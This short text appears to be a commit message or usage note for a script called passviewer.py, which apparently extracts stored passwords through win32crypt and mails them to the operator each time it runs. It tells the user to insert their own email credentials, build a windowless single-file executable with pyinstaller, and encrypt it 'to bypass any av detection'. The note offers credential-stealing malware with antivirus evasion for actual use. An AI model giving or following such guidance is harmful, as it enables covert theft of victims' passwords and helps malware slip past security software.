update passviewer.py
This script is fairly straight forward just replace the emails and the password with the actual once and you'll get a main everytime 
it runs. This script might not work properly in windows 7 or less as there is a problem with the win32crypt import change the import according to the need and it will work.
Also while making the exe use pyinstaller with the -F and -w option along with the crypt function to encrypt the file to bypass any av detection.